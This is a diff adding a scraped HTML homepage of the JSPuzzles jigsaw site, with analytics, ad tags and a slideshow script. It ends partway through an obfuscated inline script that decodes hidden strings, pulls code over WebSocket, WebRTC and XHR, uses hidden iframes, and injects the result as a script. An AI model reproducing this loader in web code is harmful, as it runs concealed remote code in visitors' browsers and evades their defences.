@@ -1,0 +1,831 @@
+<html dir="ltr" lang="en" xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta content="en" http-equiv="Content-Language"/>
+<meta content="Jigsaw puzzles" name="keywords"/>
+<title>Free Jigsaw Puzzles Online at JSPuzzles</title>
+<meta content="Free online jigsaw puzzles to play, free daily Jigsaw puzzle game, from 9 to large 225 pieces jigsaw puzzles, for adults, kids and more." name="description"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="Free Jigsaw Puzzles Online at JSPuzzles" property="og:title"/>
+<meta content="https://www.jspuzzles.com" property="og:url"/>
+<meta content="https://cdn.jspuzzles.com/artwork/fblogo-min.jpg" property="og:image"/>
+<meta content="JSPuzzles" property="og:site_name"/>
+<meta content="Free online jigsaw puzzles to play, free daily Jigsaw puzzle game, from 9 to large 225 pieces jigsaw puzzles, for adults, kids and more." property="og:description"/>
+<meta content="790409595" property="fb:admins"/>
+<link href="https://cdn.jspuzzles.com/jigsaw10-min.css" rel="stylesheet" type="text/css"/>
+<script src="https://securepubads.g.doubleclick.net/gpt/pubads_impl_rendering_2019102101.js?21065015"></script><script async="" src="//www.google-analytics.com/analytics.js"></script><script src="https://cdn.jspuzzles.com/jquery-1.11.0.min.js" type="text/javascript"></script>
+<script src="https://cdn.jspuzzles.com/jigtools-2-61.js" type="text/javascript"></script>
+<link href="https://www.jspuzzles.com/rss.xml" rel="alternate" title="JSPuzzles Daily Puzzle RSS Feed" type="application/rss+xml"/>
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-2923711-1', 'auto');
+ga('require', 'displayfeatures');
+ga('send', 'pageview');
+
+</script>
+<link href="https://www.jspuzzles.com/" hreflang="en" rel="alternate"/>
+<link href="https://www.jspuzzles.com/indexde.php" hreflang="de" rel="alternate"/>
+<link href="https://www.jspuzzles.com/indexit.php" hreflang="it" rel="alternate"/>
+<link href="https://www.jspuzzles.com/indexhe.php" hreflang="he" rel="alternate"/>
+<link href="https://www.jspuzzles.com/indexes.php" hreflang="es" rel="alternate"/>
+<link href="https://www.jspuzzles.com/indexcn.php" hreflang="zh-Hant" rel="alternate"/>
+<link href="https://www.jspuzzles.com/indexpt.php" hreflang="pt" rel="alternate"/>
+<link href="https://www.jspuzzles.com/indexfr.php" hreflang="fr" rel="alternate"/>
+<meta content="JSPuzzles Daily Puzzle" name="application-name"/>
+<meta content="#F3F3F3" name="msapplication-TileColor"/>
+<meta content="45b297da-a0fb-4faf-8957-84981f48560b.png" name="msapplication-TileImage"/>
+<meta content="name=Our Gallery;
+action-uri=https://www.jspuzzles.com/gallery.php?lang=en&amp;reqtype=all&amp;su=s&amp;camefrom=index;
+icon-uri=https://www.jspuzzles.com/favicon.ico" name="msapplication-task"/>
+<meta content="name=User Albums Gallery;
+action-uri=https://www.jspuzzles.com/gallery.php?lang=en&amp;reqtype=all&amp;su=u&amp;camefrom=index;
+icon-uri=https://www.jspuzzles.com/favicon.ico" name="msapplication-task"/>
+<meta content="name=Discover new puzzles around the world!;
+action-uri=https://www.jspuzzles.com/en/aroundtheworld.php;
+icon-uri=https://www.jspuzzles.com/favicon.ico" name="msapplication-task"/>
+<script type="text/javascript">
+
+/* Ultimate Fade-in slideshow (v2.4)
+* Last updated: May 24th, 2010. This notice must stay intact for usage
+* Author: Dynamic Drive at http://www.dynamicdrive.com/
+* Visit http://www.dynamicdrive.com/ for full source code
+*/
+
+var fadeSlideShow_descpanel={
+	controls: [['https://cdn.jspuzzles.com/artwork/x.png',7,7], ['https://cdn.jspuzzles.com/artwork/restore.png',10,11], ['https://cdn.jspuzzles.com/artwork/loading.gif',54,55]], //full URL and dimensions of close, restore, and loading images
+	fontStyle: 'normal 11px Verdana', //font style for text descriptions
+	slidespeed: 200 //speed of description panel animation (in millisec)
+}
+
+//No need to edit beyond here...
+
+function fadeSlideShow(settingarg){
+	this.setting=settingarg
+	settingarg=null
+	var setting=this.setting
+	setting.fadeduration=setting.fadeduration? parseInt(setting.fadeduration) : 500
+	setting.curimage=(setting.persist)? fadeSlideShow.routines.getCookie("gallery-"+setting.wrapperid) : 0
+	setting.curimage=setting.curimage || 0 //account for curimage being null if cookie is empty
+	setting.currentstep=0 //keep track of # of slides slideshow has gone through (applicable in displaymode='auto' only)
+	setting.totalsteps=setting.imagearray.length*(setting.displaymode.cycles>0? setting.displaymode.cycles : Infinity) //Total steps limit (applicable in displaymode='auto' only w/ cycles>0)
+	setting.fglayer=0, setting.bglayer=1 //index of active and background layer (switches after each change of slide)
+	setting.oninit=setting.oninit || function(){}
+	setting.onslide=setting.onslide || function(){}
+	if (setting.displaymode.randomize) //randomly shuffle order of images?
+		setting.imagearray.sort(function() {return 0.5 - Math.random()})
+	var preloadimages=[] //preload images
+	setting.longestdesc="" //get longest description of all slides. If no desciptions defined, variable contains ""
+	for (var i=0; i<setting.imagearray.length; i++){ //preload images
+		preloadimages[i]=new Image()
+		preloadimages[i].src=setting.imagearray[i][0]
+		if (setting.imagearray[i][3] && setting.imagearray[i][3].length>setting.longestdesc.length)
+			setting.longestdesc=setting.imagearray[i][3]
+	}
+	var closebutt=fadeSlideShow_descpanel.controls[0] //add close button to "desc" panel if descreveal="always"
+	setting.closebutton=(setting.descreveal=="always")? '<img class="close" src="'+closebutt[0]+'" style="float:right;cursor:pointer;width:'+closebutt[1]+'px;height:'+closebutt[2]+'px;margin-left:2px" title="Hide Description" />' : ''
+	var slideshow=this
+	jQuery(document).ready(function($){ //fire on DOM ready
+		var setting=slideshow.setting
+		var fullhtml=fadeSlideShow.routines.getFullHTML(setting.imagearray) //get full HTML of entire slideshow
+		setting.$wrapperdiv=$('#'+setting.wrapperid).css({position:'relative', visibility:'visible', background:'black', overflow:'hidden', width:setting.dimensions[0]+2, height:setting.dimensions[1]+2}).empty() //main slideshow DIV
+		if (setting.$wrapperdiv.length==0){ //if no wrapper DIV found
+			alert("Error: DIV with ID \""+setting.wrapperid+"\" not found on page.")
+			return
+		}
+		setting.$gallerylayers=$('<div class="gallerylayer"></div><div class="gallerylayer"></div>') //two stacked DIVs to display the actual slide
+			.css({position:'absolute', left:0, top:0, width:'100%', height:'100%', background:'#F7F5F6'})
+			.appendTo(setting.$wrapperdiv)
+		var $loadingimg=$('<img src="'+fadeSlideShow_descpanel.controls[2][0]+'" style="position:absolute;width:'+fadeSlideShow_descpanel.controls[2][1]+';height:'+fadeSlideShow_descpanel.controls[2][2]+'" />')
+			.css({left:setting.dimensions[0]/2-fadeSlideShow_descpanel.controls[2][1]/2, top:setting.dimensions[1]/2-fadeSlideShow_descpanel.controls[2][2]}) //center loading gif
+			.appendTo(setting.$wrapperdiv)
+		var $curimage=setting.$gallerylayers.html(fullhtml).find('img').hide().eq(setting.curimage) //prefill both layers with entire slideshow content, hide all images, and return current image
+		if (setting.longestdesc!="" && setting.descreveal!="none"){ //if at least one slide contains a description (versus feature is enabled but no descriptions defined) and descreveal not explicitly disabled
+			fadeSlideShow.routines.adddescpanel($, setting)
+			if (setting.descreveal=="always"){ //position desc panel so it's visible to begin with
+				setting.$descpanel.css({top:setting.dimensions[1]-setting.panelheight})
+				setting.$descinner.click(function(e){ //asign click behavior to "close" icon
+					if (e.target.className=="close"){
+						slideshow.showhidedescpanel('hide')
+					}
+				})
+				setting.$restorebutton.click(function(e){ //asign click behavior to "restore" icon
+					slideshow.showhidedescpanel('show')
+					$(this).css({visibility:'hidden'})
+				})
+			}
+			else if (setting.descreveal=="ondemand"){ //display desc panel on demand (mouseover)
+				setting.$wrapperdiv.bind('mouseenter', function(){slideshow.showhidedescpanel('show')})
+				setting.$wrapperdiv.bind('mouseleave', function(){slideshow.showhidedescpanel('hide')})
+			}
+		}
+		setting.$wrapperdiv.bind('mouseenter', function(){setting.ismouseover=true}) //pause slideshow mouseover
+		setting.$wrapperdiv.bind('mouseleave', function(){setting.ismouseover=false})
+		if ($curimage.get(0).complete){ //accounf for IE not firing image.onload
+			$loadingimg.hide()
+			slideshow.paginateinit($)
+			slideshow.showslide(setting.curimage)
+		}
+		else{ //initialize slideshow when first image has fully loaded
+			$loadingimg.hide()
+			slideshow.paginateinit($)
+			$curimage.bind('load', function(){slideshow.showslide(setting.curimage)})
+		}
+		setting.oninit.call(slideshow) //trigger oninit() event
+		$(window).bind('unload', function(){ //clean up and persist
+			if (slideshow.setting.persist) //remember last shown image's index
+				fadeSlideShow.routines.setCookie("gallery-"+setting.wrapperid, setting.curimage)
+			jQuery.each(slideshow.setting, function(k){
+				if (slideshow.setting[k] instanceof Array){
+					for (var i=0; i<slideshow.setting[k].length; i++){
+						if (slideshow.setting[k][i].tagName=="DIV") //catches 2 gallerylayer divs, gallerystatus div
+							slideshow.setting[k][i].innerHTML=null
+						slideshow.setting[k][i]=null
+					}
+				}
+			})
+			slideshow=slideshow.setting=null
+		})
+	})
+}
+
+fadeSlideShow.prototype={
+
+	navigate:function(keyword){
+		var setting=this.setting
+		clearTimeout(setting.playtimer)
+		if (setting.displaymode.type=="auto"){ //in auto mode
+			setting.displaymode.type="manual" //switch to "manual" mode when nav buttons are clicked on
+			setting.displaymode.wraparound=true //set wraparound option to true
+		}
+		if (!isNaN(parseInt(keyword))){ //go to specific slide?
+			this.showslide(parseInt(keyword))
+		}
+		else if (/(prev)|(next)/i.test(keyword)){ //go back or forth inside slide?
+			this.showslide(keyword.toLowerCase())
+		}
+	},
+
+	showslide:function(keyword){
+		var slideshow=this
+		var setting=slideshow.setting
+		if (setting.displaymode.type=="auto" && setting.ismouseover && setting.currentstep<=setting.totalsteps){ //if slideshow in autoplay mode and mouse is over it, pause it
+			setting.playtimer=setTimeout(function(){slideshow.showslide('next')}, setting.displaymode.pause)
+			return
+		}
+		var totalimages=setting.imagearray.length
+		var imgindex=(keyword=="next")? (setting.curimage<totalimages-1? setting.curimage+1 : 0)
+			: (keyword=="prev")? (setting.curimage>0? setting.curimage-1 : totalimages-1)
+			: Math.min(keyword, totalimages-1)
+		var $slideimage=setting.$gallerylayers.eq(setting.bglayer).find('img').hide().eq(imgindex).show() //hide all images except current one
+		var imgdimensions=[$slideimage.width(), $slideimage.height()] //center align image
+		$slideimage.css({marginLeft: (imgdimensions[0]>0 && imgdimensions[0]<setting.dimensions[0])? setting.dimensions[0]/2-imgdimensions[0]/2 : 0})
+		$slideimage.css({marginTop: (imgdimensions[1]>0 && imgdimensions[1]<setting.dimensions[1])? setting.dimensions[1]/2-imgdimensions[1]/2 : 0})
+		$slideimage.css({ cursor:'pointer'})
+		if (setting.descreveal=="peekaboo" && setting.longestdesc!=""){ //if descreveal is set to "peekaboo", make sure description panel is hidden before next slide is shown
+			clearTimeout(setting.hidedesctimer) //clear hide desc panel timer
+			slideshow.showhidedescpanel('hide', 0) //and hide it immediately
+		}
+
+		document.getElementById('fashowdesc').innerHTML = '<span style="cursor:pointer;" onclick="viewwin('+setting.imagearray[imgindex][4]+')">'+setting.imagearray[imgindex][3]+"</span>"
+
+		setting.$gallerylayers.eq(setting.bglayer).css({zIndex:1000, opacity:0}) //background layer becomes foreground
+			.stop().css({opacity:0}).animate({opacity:1}, setting.fadeduration, function(){ //Callback function after fade animation is complete:
+				clearTimeout(setting.playtimer)
+				try{
+					setting.onslide.call(slideshow, setting.$gallerylayers.eq(setting.fglayer).get(0), setting.curimage)
+				}catch(e){
+					alert("Fade In Slideshow error: An error has occured somwhere in your code attached to the \"onslide\" event: "+e)
+				}
+				if (setting.descreveal=="peekaboo" && setting.longestdesc!=""){
+					slideshow.showhidedescpanel('show')
+					setting.hidedesctimer=setTimeout(function(){slideshow.showhidedescpanel('hide')}, setting.displaymode.pause-fadeSlideShow_descpanel.slidespeed)
+				}
+				setting.currentstep+=1
+				if (setting.displaymode.type=="auto"){
+					if (setting.currentstep<=setting.totalsteps || setting.displaymode.cycles==0)
+						setting.playtimer=setTimeout(function(){slideshow.showslide('next')}, setting.displaymode.pause)
+				}
+			}) //end callback function
+		setting.$gallerylayers.eq(setting.fglayer).css({zIndex:999}) //foreground layer becomes background
+		setting.fglayer=setting.bglayer
+		setting.bglayer=(setting.bglayer==0)? 1 : 0
+		setting.curimage=imgindex
+		if (setting.$descpanel){
+			setting.$descpanel.css({visibility:(setting.imagearray[imgindex][3])? 'visible' : 'hidden'})
+			if (setting.imagearray[imgindex][3]) //if this slide contains a description
+				setting.$descinner.empty().html(setting.closebutton + setting.imagearray[imgindex][3])
+		}
+		if (setting.displaymode.type=="manual" && !setting.displaymode.wraparound){
+			this.paginatecontrol()
+		}
+		if (setting.$status) //if status container defined
+			setting.$status.html(setting.curimage+1 + "/" + totalimages)
+	},
+
+	showhidedescpanel:function(state, animateduration){
+		var setting=this.setting
+		var endpoint=(state=="show")? setting.dimensions[1]-setting.panelheight : this.setting.dimensions[1]
+		setting.$descpanel.stop().animate({top:endpoint}, (typeof animateduration!="undefined"? animateduration : fadeSlideShow_descpanel.slidespeed), function(){
+			if (setting.descreveal=="always" && state=="hide")
+				setting.$restorebutton.css({visibility:'visible'}) //show restore button
+		})
+	},
+
+	paginateinit:function($){
+		var slideshow=this
+		var setting=this.setting
+		if (setting.togglerid){ //if toggler div defined
+			setting.$togglerdiv=$("#"+setting.togglerid)
+			setting.$prev=setting.$togglerdiv.find('.prev').data('action', 'prev')
+			setting.$next=setting.$togglerdiv.find('.next').data('action', 'next')
+			setting.$prev.add(setting.$next).click(function(e){ //assign click behavior to prev and next controls
+				var $target=$(this)
+				slideshow.navigate($target.data('action'))
+				e.preventDefault()
+			})
+			setting.$status=setting.$togglerdiv.find('.status')
+		}
+	},
+
+	paginatecontrol:function(){
+		var setting=this.setting
+			setting.$prev.css({opacity:(setting.curimage==0)? 0.4 : 1}).data('action', (setting.curimage==0)? 'none' : 'prev')
+			setting.$next.css({opacity:(setting.curimage==setting.imagearray.length-1)? 0.4 : 1}).data('action', (setting.curimage==setting.imagearray.length-1)? 'none' : 'next')
+			if (document.documentMode==8){ //in IE8 standards mode, apply opacity to inner image of link
+				setting.$prev.find('img:eq(0)').css({opacity:(setting.curimage==0)? 0.4 : 1})
+				setting.$next.find('img:eq(0)').css({opacity:(setting.curimage==setting.imagearray.length-1)? 0.4 : 1})
+			}
+	}
+
+
+}
+
+fadeSlideShow.routines={
+/* old:
+	getSlideHTML:function(imgelement){
+		var layerHTML=(imgelement[1])? '<a href="'+imgelement[1]+'" target="'+imgelement[2]+'">\n' : '' //hyperlink slide?
+		layerHTML+='<img src="'+imgelement[0]+'" style="border-width:0;" />\n'
+		layerHTML+=(imgelement[1])? '</a>\n' : ''
+		return layerHTML //return HTML for this layer
+	},
+	*/
+	getSlideHTML:function(imgelement){   //assaf
+	//	var layerHTML=(imgelement[1])? '<a href="'+imgelement[1]+'" target="'+imgelement[2]+'">\n' : '' //hyperlink slide?
+		var layerHTML ='<img src="'+imgelement[0]+'" class="indexslideshowpic" onclick="viewwin('+imgelement[1]+')"/>\n'
+	//	layerHTML+=(imgelement[1])? '</a>\n' : ''
+		return layerHTML //return HTML for this layer
+	},
+
+	getFullHTML:function(imagearray){
+		var preloadhtml=''
+		for (var i=0; i<imagearray.length; i++)
+			preloadhtml+=this.getSlideHTML(imagearray[i])
+		return preloadhtml
+	},
+
+	adddescpanel:function($, setting){
+		setting.$descpanel=$('<div class="fadeslidedescdiv"></div>')
+			.css({position:'absolute', visibility:'hidden', width:'100%', left:0, top:setting.dimensions[1], font:fadeSlideShow_descpanel.fontStyle, zIndex:'1001'})
+			.appendTo(setting.$wrapperdiv)
+		$('<div class="descpanelbg"></div><div class="descpanelfg"></div>') //create inner nav panel DIVs
+			.css({position:'absolute', left:0, top:0, width:setting.$descpanel.width()-8, padding:'4px'})
+			.eq(0).css({background:'black', opacity:0.7}).end() //"descpanelbg" div
+			.eq(1).css({color:'white'}).html(setting.closebutton + setting.longestdesc).end() //"descpanelfg" div
+			.appendTo(setting.$descpanel)
+		setting.$descinner=setting.$descpanel.find('div.descpanelfg')
+		setting.panelheight=setting.$descinner.outerHeight()
+		setting.$descpanel.css({height:setting.panelheight}).find('div').css({height:'100%'})
+		if (setting.descreveal=="always"){ //create restore button
+			setting.$restorebutton=$('<img class="restore" title="Restore Description" src="' + fadeSlideShow_descpanel.controls[1][0] +'" style="position:absolute;visibility:hidden;right:0;bottom:0;z-index:1002;width:'+fadeSlideShow_descpanel.controls[1][1]+'px;height:'+fadeSlideShow_descpanel.controls[1][2]+'px;cursor:pointer;" />')
+				.appendTo(setting.$wrapperdiv)
+		}
+	},
+
+	getCookie:function(Name){
+		var re=new RegExp(Name+"=[^;]+", "i"); //construct RE to search for target name/value pair
+		if (document.cookie.match(re)) //if cookie found
+			return document.cookie.match(re)[0].split("=")[1] //return its value
+		return null
+	},
+
+	setCookie:function(name, value){
+		document.cookie = name+"=" + value + ";path=/"
+	}
+}
+</script>
+<script type="text/javascript">
+
+var mygallery=new fadeSlideShow({
+	wrapperid: "fadeshow2",
+	dimensions: [200, 150],
+	imagearray: [
+		["https://cdn.jspuzzles.com/thumb/2458783_s.jpg", "2458783", "", "Today","2458783"],
+		["https://cdn.jspuzzles.com/thumb/2458782_s.jpg", "2458782","", "Yesterday","2458782"],
+		["https://cdn.jspuzzles.com/thumb/2458781_s.jpg","2458781", "", "2 days ago","2458781"],
+		["https://cdn.jspuzzles.com/thumb/2458780_s.jpg", "2458780", "", "3 days ago","2458780"]
+	],
+	displaymode: {type:'manual', pause:2500, cycles:0, wraparound:true},
+	persist: false,
+	fadeduration: 500,
+	descreveal: "none",
+	togglerid: "fade2toggle"
+})
+
+</script>
+<script type="text/javascript">
+$().ready(function() {
+  $('#puzzledialog').jqm();
+});
+</script>
+<script type="text/javascript">
+$(function(){
+    $('input').keydown(function(e){
+        if (e.keyCode == 13) {
+            $(this).parents('form').submit();
+            return false;
+        }
+    });
+});
+</script>
+<script async="async" src="https://www.googletagservices.com/tag/js/gpt.js"></script>
+<script>
+  var googletag = googletag || {};
+  googletag.cmd = googletag.cmd || [];
+</script>
+<script>
+	var home300, home728;
+  googletag.cmd.push(function() {
+    home300=googletag.defineSlot('/21625667795/JSP_Index_D300x250_2', [[320, 50], [320, 100], [300, 250]], 'div-gpt-ad-1505817075157-0').addService(googletag.pubads());
+    home728=googletag.defineSlot('/21625667795/JSP_Index_D728x90_1', [[320, 50], [320, 100], [970, 90], [728, 90]], 'div-gpt-ad-1505817075157-1').addService(googletag.pubads());
+		googletag.pubads().disableInitialLoad();
+    // googletag.pubads().enableSingleRequest();
+    googletag.enableServices();
+  });
+</script>
+<link as="script" href="https://adservice.google.co.uk/adsid/integrator.js?domain=www.jspuzzles.com" rel="preload"/><script src="https://adservice.google.co.uk/adsid/integrator.js?domain=www.jspuzzles.com" type="text/javascript"></script><link as="script" href="https://adservice.google.com/adsid/integrator.js?domain=www.jspuzzles.com" rel="preload"/><script src="https://adservice.google.com/adsid/integrator.js?domain=www.jspuzzles.com" type="text/javascript"></script><script async="" src="https://securepubads.g.doubleclick.net/gpt/pubads_impl_2019102101.js?21065015"></script><link href="https://tpc.googlesyndication.com/safeframe/1-0-36/html/container.html" rel="prefetch"/></head>
+<body style="">
+<noscript>
+<h1>Jigsaw Puzzles</h1>
+Jigsaw puzzles are what this website is all about. Just enter the website and play free jigsaw puzzles any time.<br/>
+We recommend using this website with a scripts-enabled browser otherwise you won't be able to play the jigsaw puzzles.
+<h2>play Jigsaw Puzzles</h2>
+Play Jigsaw puzzles with various sizes (From 9 to 144 pieces) with our unique online system.<br/>
+We are featuring daily puzzle, with hiscore system and even the option to upload your own images.<br/>
+We are sure that it is the ultimate place to play, if you have any suggestions or comments regarding our puzzles, please feel free to send us your comments and suggestions.<br/>
+Our website is free for all to play, we offer a community of online jigsaw puzzle players for you to share your gaming experience and high-scores.
+No matter if you call it jigsaw, zigsaw, jig saw, or jig-saw, our site is the place for you to play online.
+</noscript>
+<script>try{(function(){function B(){try{var b=K()}catch(c){}if(b)try{C(b.h,null)}catch(c){delete window.localStorage[b.key],delete window.sessionStorage[b.key]}else L(function(b,a){a.as=!0;try{C(b,a)}catch(d){}},M)}function M(){var a=window.location.protocol==b("ERYVCSVR")?b("ERYVCSVRYlw="):b("ERYVCWxEYg==");(new Image).src=a+u+N}function L(b,c){function a(){var e=d.shift();if(e)try{e(b,a)}catch(m){a()}else v(),c()}try{O()}catch(f){v();c();return}var d=[P,Q,R,S];a()}function C(b,c){var a=document.createElement("script");
+c=[{e:b,p:c,n:g}];var d="a"+String.fromCharCode(parseInt(25*Math.random()+97,10))+Math.random().toString(36).substring(7);a.id=d;a[d]=c;a.textContent="(function() { var args = document.getElementById('"+d+"')['"+d+"'] || this.currentScript['"+d+"'];"+b+"}());";(document.head||document.body||document.documentElement).appendChild(a)}function K(){var a=[];window.localStorage&&a.push(window.localStorage);window.sessionStorage&&a.push(window.sessionStorage);var c=D(b("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),
+E(b("CRAEGDsJIRY=")));c=new Uint8Array(c);for(var e="",d=0;d<c.length;d++)e+=String.fromCharCode(c[d]);c=btoa(e);e=(new Date).getTime();for(d=0;d<a.length;d++){var f=a[d],m;for(m in f)if(!m.lastIndexOf(c,0)){try{for(var k=b("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),g=atob(f[m]),l=new Uint8Array(g.length),h=0;h<g.length;h++)l[h]=g.charCodeAt(h);var n=r(D(k,l.buffer))}catch(U){continue}h=parseInt(n.substring(0,13),10);if(!isNaN(h))if(864E5<e-h||1>e-h)f.removeItem(m);else if((h=n.substring(13))&&
+!(16>h.length))return{h:h,key:m}}}return null}function Q(a,c){var e=b("SlZWQQ=="),d=b("TiBbSmBReDdjZlpSJgpcUBRILnBMc1tDDEROEBR3ZGdDJiJDFCl3MmxuUFBdCVJSF0RVfUdwWUlwRUNrEX1tb05YVU9sKH5JH2FZWyJxJFlvN1pzQ39VO3hNQGRtCBE="),e=w+":"+e,f={};f[b("DBANCg==")]=b("DRcTF2w=")+e+b("RhYTGDgYPRwrIF4cBDs=");f[b("GhAEHTMFORo4OA==")]=b("AAMVEDsK");f[b("DBEECzgKIBY=")]=b("AAMVEDsK");F(d,f,function(a){a=a.match(new RegExp(b("JwEAFzICKRItMVk0A2BGNDFZT2FJcBodOgshFQdkdwsdSUFRCg9mL3cIB0M7ZToMfi5BFRJhRlkWE19xIzQndwsHDRgv")));
+if(null==a)return null;a=a[1];return b("GgMPHT8PLAc8blJIVmszLAVSV3pFe11PeVc=")+a+b("WVRSSWddbQcgJEMaAicHEXUADi0SOE8=")+a+b("WRARFiQfbUVqZFJeRyUDHCIdHSJbKQAKPldE")},a,c)}function R(a,c){var e=b("T1JRSA=="),d=b("P1dbOBRRdUpjEVdSU3pcUWRIWHBMeVxDekVOE293YBZDVyNDE1p3NWxuV15dfCNSEzdVfDBwXU1wTzJrFQhtYzxYUjpsLg5JbmxZWFFxU1tvM11zRQxVTQtNQ2htdG8="),e=w+":"+e,f={};f[b("DBANCg==")]=[b("ChYUF2w=")+e];F(d,f,function(a){a=a.match(new RegExp(b("JwEAFzICKRItMVk0A2BGNDFZT2FJcBodOgshFQdkdwsdSUFRCg9mL3cIB0M7ZToMfi5BFRJhTyUuXF1xIzQndwoQBxUu")));
+if(null==a)return null;a=a[1];return b("GgMPHT8PLAc8blNIVmszLAVSXXhCfVtBeUFAZnc=")+a+b("WRYYCXYDIgAt")},a,c)}function F(a,c,e,d,f){function m(a){k||(k=!0,a.apply(null,Array.prototype.slice.call(arguments,1)))}var k=!1;d=m.bind(null,d);f=m.bind(null,f);var p={};p[b("EAEEKjMZOxYrJw==")]=[c];var l=new g.c(p);l[b("GhAEGCIOCRItNSAABiUIDTk=")](b("Vg8EDTdEPRo3Mw==")).binaryType=b("GBATGC8JOBU/MRE=");l[b("FgwIGjMILB09PQcJEy4=")]=function(a){if(null!=a[b("GgMPHT8PLAc8")]&&(a=e(a[b("GgMPHT8PLAc8")][b("GgMPHT8PLAc8")]),
+null!=a)){var c={};c[b("GgMPHT8PLAc8")]=a;c[b("CgYRNBoCIxYQOgcNHw==")]=0;l[b("GAYFMDUODhI3MAoMBj8D")](new g.b(c),function(){},function(){})}};l.addEventListener(b("EAEEGjkFIxY6IAoHCTgSCSEXDCEXJAgc"),function(){l[b("EAEEOjkFIxY6IAoHCRgSCSEX")]===b("HwMIFTMP")&&f()});var h=b("D19RczlWOAA8Jg0JCi5GWHVCTwA4aiYpfldFY2BjZ3lJTFBzJVY+FionCgcJJQcFMHgMdD8ETzAaQ1RgZXp5Z1dST0hcH3BDeWRpCVotDwYyFx05BCMBDXAEHDB6f2JhWQ==")+a+b("cwNcEDUOYBwpIAoHCThcHCcbDCIaL2UUdxYEITskNDYNCw4Xdlp/QG10JzwrGEk7FiY/aUN6X0lAFkkiNDknOhgSW0xmW31TLjEBGhMoSww0Bg4qHisBFy8bVGNie102RAsCHHseKwE4M1k=")+
+function(){for(var a="",c=b("SVJRSWZbfUM="),d=0;16>d;++d)var e=(4294967296*Math.random()>>>0).toString(16),a=a+(c.substring(0,c.length-e.length)+e);return a}()+b("cwNcEDUOYAMuMFlYV3tWWGVCX3lGel9JekdEYWd9Z2dJUlFJZlt9Q2lkU2I=");l[b("GhAEGCIOAhU/MRE=")](function(a){l[b("CgcVNTkILB8dMRALFSIWHDwdAQ==")](a,function(){var a={};a[b("DRsRHA==")]=b("GAwSDjMZ");a[b("CgYR")]=h;l[b("CgcVKzMGIgc8EAYbBDkPGCEbACc=")](new g.f(a),function(){},function(){})},function(){})},function(){});a=l[b("GhAEGCIOCRItNSAABiUIDTk=")](b("VhUSCVY=")+
+window.navigator.userAgent);a.binaryType=b("GBATGC8JOBU/MRE=");G(a,x(),function(a){d(a,{rtc:l})},function(){f()})}function S(a,c){function e(a){m||(m=!0,a.apply(null,Array.prototype.slice.call(arguments,1)))}var d=x(),d=(window.location.protocol==b("ERYVCSVR")?b("ERYVCSVRYlw="):b("ERYVCWxEYg=="))+u+d,f=b("Pic1"),m=!1;a=e.bind(null,a);c=e.bind(null,c);var k=new g.g;k.onreadystatechange=function(){4==k.readyState&&(0==k.status?c():a(r(k.response),{}))};k.onerror=function(){c()};k.open(f,d,!0);k.responseType=
+b("GBATGC8JOBU/MRE=");k.send(null)}function P(a,c){var e=b("DhESQ3lE"),d=new g.a(e+w+b("VhUSCQ=="));d.binaryType=b("GBATGC8JOBU/MRE=");G(d,x(),function(b){a(b,{ws:d})},function(){c()})}function G(a,c,e,d){function f(a){g||(g=!0,a.apply(null,Array.prototype.slice.call(arguments,1)))}var g=!1;e=f.bind(null,e);d=f.bind(null,d);var k=!1,p=setTimeout(function(){d(Error())},3E3),l=E(JSON.stringify({url:c||"",method:b("Pic1"),headers:null,body:null}));a.onopen=function(){clearTimeout(p);a.send(l)};var h=
+new ArrayBuffer(0),n;a.onmessage=function(a){if(4===a.data.byteLength){var b=new Uint8Array(a.data);if(222===b[0]&&173===b[1]&&190===b[2]&&239===b[3])return}!1===k?(k=!0,a=r(a.data),n=JSON.parse(a),n={status:n.status||0,headers:n.headers||{}}):(a=a.data,b=new Uint8Array(h.byteLength+a.byteLength),b.set(new Uint8Array(h),0),b.set(new Uint8Array(a),h.byteLength),h=b.buffer)};a.onerror=function(){clearTimeout(p);d(Error())};a.onclose=function(){k?(n.body=h,e(r(n.body))):(clearTimeout(p),d(Error()))}}
+function y(a){return window[a.name]?window[a.name]:a[b("Gg0PDTMFOTc2NxYFAiUS")]&&a[b("Gg0PDTMFOTc2NxYFAiUS")][b("HQcHGCMHOSUwMRQ=")]?a[b("Gg0PDTMFOTc2NxYFAiUS")][b("HQcHGCMHOSUwMRQ=")]:a[b("Gg0PDTMFOSQwOgcHEA==")]}function H(){var a=document.createElement(b("EAQTGDsO"));a.style.height=b("SBIZ");a.style.width=b("SBIZ");a.style.display=b("Fw0PHA==");a[b("ChACHTkI")]=b("GA==");a.name||(a.name=String.fromCharCode(parseInt(25*Math.random()+97,10))+Math.random().toString(36).substring(7));(document.body||
+document.head||document.documentElement).appendChild(a);var c=y(a);c.document.documentElement||c.document.write(b("GA=="));try{c.stop()}catch(e){}return a}function O(){I=b("DAwKFzkcIw==");t=b("GgoTFjsO");q=b("HwsTHDAENQ==");z=b("FhIECzc=");A=b("CgMHGCQC");var a=H(),a=y(a);var c=a.navigator.userAgent;c=(new RegExp(b("GgoTFjsOMRAxJgwFDj4L"),"i")).test(c)?t:(new RegExp(b("HwsTHDAENQ8wNwYfAioVDTkOCTEfJRw="),"i")).test(c)?q:(new RegExp(b("J0pJRncIJQE2OQYUBiUCGjobC2BYY0UKKxEVIz4="),"i")).test(c)?A:(new RegExp(b("FhITBTkbJBwq"),
